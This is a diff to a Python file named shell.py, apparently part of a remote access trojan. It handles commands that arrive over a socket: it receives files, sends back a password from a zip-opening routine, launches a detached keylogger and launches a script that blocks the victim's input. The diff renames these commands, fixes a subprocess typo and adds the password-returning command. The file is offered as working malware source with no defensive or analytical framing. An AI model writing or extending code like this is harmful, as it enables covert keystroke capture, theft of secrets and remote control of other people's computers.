@@ -1,5 +1,14 @@
 #! /usr/bin/env python
+##
+#\file shell.py
+#
+#\brief The shell to run incoming commands
+#
+#\author Elephant Bomb
+#
+#\date 2016-04-24
 from incomingFile import incomingFile
+from openZip import openZip
 import subprocess
 import sys
 
@@ -8,21 +17,24 @@ def runShell(socketHolder):
 	if data:
 		if data == "SENDFILE":
 			incomingFile(data, socketHolder)
-		elif data == "exit":
-			socketHolder.send('exit')
+		elif data == "OPENZIP":
+			password = openZip()
+			socketHolder.send(password)
+		elif data == "EXIT":
+			socketHolder.send('EXIT')
 			socketHolder.close()
 			sys.exit(0)
-		elif data == "logKeysOn":
+		elif data == "LOGKEYSON":
 			# Execute an external program without waiting for it to finish
 			CREATE_NEW_PROCESS_GROUP = 0x00000200
 			DETACHED_PROCESS = 0x00000008
 			pid = subprocess.Popen([sys.executable, "logKeys.py"],
 				creationflags=DETACHED_PROCESS).pid
 			socketHolder.send('Logger started')
-		elif data == 'blockInput':
+		elif data == 'BLOCKINPUT':
 			CREATE_NEW_PROCESS_GROUP = 0x00000200
 			DETACHED_PROCESS = 0x00000008
-			pid = subproess.Popen([sys.executable, "blockInput.py"],
+			pid = subprocess.Popen([sys.executable, "blockInput.py"],
 				creationflags=DETACHED_PROCESS).pid
 			socketHolder.send('Block Input started')
 		elif len(data) == 0:
